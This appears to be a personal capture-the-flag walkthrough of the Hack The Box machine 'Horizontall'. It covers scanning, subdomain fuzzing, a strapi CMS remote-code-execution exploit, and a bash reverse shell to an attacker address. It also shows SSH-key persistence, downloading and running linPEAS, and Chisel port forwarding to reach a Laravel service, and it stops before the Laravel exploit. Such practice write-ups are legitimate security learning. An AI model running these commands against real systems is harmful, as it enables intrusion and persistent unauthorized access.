## Issues

### horizontall.htb is an invalid host

Add these entries to `/etc/hosts` (IP may be different):

    10.10.11.105    horizontall.htb
    10.10.11.105    api-prod.horizontall.htb

## Recon

### nmap

    ┌─[✗]─[vagrant@parrot]─[~]
    └──╼ $nmap -sC -sV 10.10.11.105
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-30 16:44 GMT
    Nmap scan report for 10.10.11.105
    Host is up (0.16s latency).
    Not shown: 989 closed tcp ports (conn-refused)
    PORT      STATE    SERVICE     VERSION
    22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
    |   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
    |_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
    80/tcp    open     http        nginx 1.14.0 (Ubuntu)
    |_http-server-header: nginx/1.14.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://horizontall.htb
    1031/tcp  filtered iad2
    4003/tcp  filtered pxc-splr-ft
    5963/tcp  filtered indy
    7512/tcp  filtered unknown
    8045/tcp  filtered unknown
    9418/tcp  filtered git
    21571/tcp filtered unknown
    32768/tcp filtered filenet-tms
    49165/tcp filtered unknown
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 39.37 seconds

There's an HTTP server.

I got lazy and looked at a [writeup](https://infosecwriteups.com/horizontall-hackthebox-walkthrough-13090d7d59a2). Apparently we're supposed to fuzz "virtual hosts".

## subdomain evaluation

May take a while. Can use `sudo iftop -i tun0` to see how much traffic is being sent.

    wfuzz -w ~/Git/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u horizontall.htb --hc 301 -v -c -H "Host:FUZZ.horizontall.htb"

Request # 000047093 gives us HTTP 200.

In `~/Git/SecLists/Discovery/DNS/subdomains-top1million-110000.txt`, line 47093:

    api-prod

## api-prod.horizontall.htb

Just a blank page that says "welcome".

[Time to fuzz!](https://wfuzz.readthedocs.io/en/latest/user/basicusage.html)

    wfuzz --sc 200 -w ~/Git/SecLists/Discovery/Web-Content/directory-list-1.0.txt http://api-prod.horizontall.htb/FUZZ

### Results

-   /reviews
    -   Some JSON API.
    -   Both `/reviews/1` and `/reviews?id=1` work
-   /admin
    -   "strapi" CMS login, redirects to `/admin/auth/login`

According to the writeup I shamelessly stole the answer from, there's some RCE bug that affects the strapi CMS.

So, going to see if I can find the RCE bug in MSF.

## strapi RCE bug

Well, I googled "MSF strapi" and found an exploit script:

<https://www.exploit-db.com/exploits/50239>

Didn't run it, but reading it, saw they query `/admin/init` for the version to see if the exploit would work.

<http://api-prod.horizontall.htb/admin/init> returns `3.0.0-beta.17.4`:

    {"data":{"uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817","currentEnvironment":"development","autoReload":false,"strapiVersion":"3.0.0-beta.17.4"}}

So, it's vulnerable, and we should be able to exploit this RCE bug.

### The exploit

    python ./strapi-cms-rce.py http://api-prod.horizontall.htb

This allows us to log in as the admin user in strapi and resets the admin's creds to `admin:SuperStrongPassword1`

You can also execute RCE as well -- `sleep 20` seems to sleep, which is fantastic.

#### Get reverse shell

Let's try to start a reverse shell.

    Note: These may change. Run `ip a` to see your IP.
    Attacker IP:    10.10.14.40
    Victim IP:      10.10.11.105

Attacker (listens for connections):

    nc -lvp 6969

Victim (init TCP connection to attacker):

    bash -c 'bash -i >& /dev/tcp/10.10.14.40/6969 0>&1'

And it works! We have shell.

```
┌─[vagrant@parrot]─[~]
└──╼ $nc -lvp 6969
listening on [any] 6969 ...
connect to [10.10.14.40] from horizontall.htb [10.10.11.105] 37142
bash: cannot set terminal process group (1897): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ whoami
whoami
strapi
strapi@horizontall:~/myapi$ 
```

I want to download the entirety of `~/myapi` to inspect it, so let's zip it and put it in `~/myapi/public`...

Run in reverse shell:

    pushd ~
    zip -r myapi.zip myapi/
    mv myapi.zip myapi/public/

    # Then, visit http://api-prod.horizontall.htb/myapi.zip to download the code

Nothing really interesting. 

Let's look in `/home/`.

## User flag

    /home/developer/user.txt

Yay! To get system flag, we probably need to do something in `/home/developer/`... Because the `strapi` user cannot view developer's files.

## System flag pls? ;_;

Because I am extremely lazy, and have basically no idea how to proceed, I'm going to cheat again :)

### Cheating >:3c 

So, apparently you can put the attacker's public key inside `/opt/strapi/.ssh/authorized_keys` to get a better shell. Because reverse shells often lack nice tty features.

    mkdir -p /opt/strapi/.ssh/
    echo "ssh-rsa whateverasdfasdf, go look in attacker's id_rsa.pub file" >> /opt/strapi/.ssh/authorized_keys

Attacker can now run:

    ssh strapi@horizontall.htb
    bash

The writeup recommends [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)...

Let's do it!

#### LinPEAS

Note this is done this way because the HTB boxes lack internet access - I can't just `curl asdf | sh` after I get reverse shell.

Attacker (build then host linpeas script):

    pushd ~/Git
    git clone 
    python3 -m builder.linpeas_builder
    python3 -m http.server

Victim (dl and exec linpeas):

    wget 10.10.14.40:8000/linpeas.sh 
    chmod +x linpeas.sh
    ./linpeas.sh -h

[See output here.](./LINPEAS_OUTPUT.txt)

It's useless -- apparently we need to exploit Laravel.

## Laravel

According to the writeup, I'm supposed to exploit Laravel, which is running on the victim, but the port isn't forwarded.

So, the first step is to port forward using a tool called "Chisel".

### Port forward Laravel

#### Get Chisel binary into victim

On attacker:

    pushd /tmp/
    if [[ ! -f chisel_1.7.6_linux_386 ]]; then
        wget "https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_386.gz"
        gunzip chisel_1.7.6_linux_386.gz
    fi
    updog -d ./

On victim:
    wget 10.10.14.40:9090/chisel_1.7.6_linux_386
    mv chisel_1.7.6_linux_386 chisel
    chmod +x chisel
    mv chisel /bin/ #if you can...
    ls

### Laravel RCE -> Root flag

#### Chisel port forward

Going to cheat again and read the guide, since I have no idea how to use Chisel.

Laravel is running on port 8000 on the victim machine -- but it is not exposed to the attacker. So, using Chisel is required in this step to expose Laravel to the attacker.

    Attacker IP:    10.10.14.40
    Victim IP:      10.10.11.105

Attacker runs:

    chisel server -p 6004 --reverse &

Victim runs:

    ./chisel client 10.10.14.40:6004 R:6001:127.0.0.1:8000

Then, visit <http://127.0.0.1:6001/> on attacker browser.

Look, it's Laravel!

Apparently, it's Laravel v8 (PHP v7.4.18)